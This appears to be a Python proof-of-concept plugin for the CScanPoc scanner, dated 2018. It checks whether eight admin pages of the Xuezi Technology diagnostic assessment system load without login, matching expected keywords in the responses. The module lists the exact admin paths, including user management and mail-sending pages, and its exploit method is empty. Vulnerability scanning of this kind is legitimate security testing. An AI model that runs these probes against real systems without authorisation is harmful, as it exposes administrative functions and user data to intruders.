# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'xuezi_0000' # 平台漏洞编号，留空
    name = '学子科技诊断测评系统多处未授权访问' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '2015-02-05'  # 漏洞公布时间
    desc = '''
        学子科技诊断测评系统多处未授权访问
    ''' # 漏洞描述
    ref = '' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'xuezi'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'xuezi_0000' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                arg + '/ceping/HouAdmin/GLGWUsers.aspx',
                arg + '/ceping/HouAdmin/GLComUser.aspx',
                arg + '/ceping/HouAdmin/GLComleibie2.aspx',
                arg + '/ceping/HouAdmin/GL_Shitileibie.aspx',
                arg + '/ceping/HouAdmin/GL_PingFen.aspx',
                arg + '/ceping/HouAdmin/GL_FenXiFuDao.aspx',
                arg + '/ceping/HouAdmin/MailSection.aspx',
                arg + '/ceping/HouAdmin/sendmails.aspx'
                ]
            verifys = [
                '注册时间',
                '注册时间',
                '类别名称',
                '添加试题类别',
                '请选择类别',
                '分析报告',
                '发件地址',
                '邮件内容'
                ]
            for i in range(len(urls)):
                url = urls[i]
                verify = verifys[i]
                code, head, res, err, _ = hh.http(url)
                if (code == 200) and (verify in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()